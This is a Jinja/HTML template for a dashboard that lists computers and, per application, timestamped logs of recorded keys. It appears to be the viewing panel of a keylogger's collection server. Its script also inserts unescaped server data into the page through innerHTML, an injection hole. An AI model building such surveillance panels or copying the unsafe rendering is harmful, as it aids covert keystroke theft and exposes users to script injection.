{% extends "base.html" %}
{% block title %}HomePage{% endblock %}

{% block content %}
    <div class="container-fluid mt-4">
        <div class="row">
            <!-- Sidebar for computer list -->
            <div class="col-md-4">
                <h3 class="text-center">Computers</h3>
                <ul class="list-group">
                    {% for computer, data in computers.items() %}
                    <li class="list-group-item list-group-item-action" onclick="fetchDetails('{{ computer }}')" style="cursor: pointer;">
                        <strong>{{ computer }}</strong> 
                        <span class="badge bg-primary text-white float-end">{{ data.app_count }} Apps, {{ data.key_count }} Keys</span>
                    </li>
                    {% endfor %}
                </ul>
            </div>

            <!-- Details Section -->
            <div class="col-md-8">
                <h3 class="text-center">Computer Details</h3>
                <div id="computer-details" class="card p-3 shadow-sm">
                    <p class="text-muted">Click a computer to see details</p>
                </div>
            </div>
        </div>
    </div>

    <script>
        function fetchDetails(computerName) {
            fetch(`/computer/${computerName}`)
                .then(response => response.json())
                .then(data => {
                    let detailsDiv = document.getElementById('computer-details');
                    detailsDiv.innerHTML = `<h4 class="text-primary">${computerName}</h4>`;
                    
                    for (let app in data) {
                        detailsDiv.innerHTML += `
                            <div class="card mb-2 p-2">
                                <h5>${app}</h5>
                                <p class="text-muted">${data[app].total_keys} keys recorded</p>
                                <button class="btn btn-sm btn-secondary" onclick="toggleLogs('${app}')">Show Logs</button>
                                <div id="log-${app}" style="display: none;">
                                    ${Object.keys(data[app].logs).map(timestamp => `
                                        <p><strong>${timestamp}:</strong> ${data[app].logs[timestamp].join(', ')}</p>`).join('')}
                                </div>
                            </div>`;
                    }
                })
                .catch(error => console.error('Error:', error));
        }
        
        function toggleLogs(app) {
            let logDiv = document.getElementById(`log-${app}`);
            logDiv.style.display = logDiv.style.display === "none" ? "block" : "none";
        }
    </script>
{% endblock %}
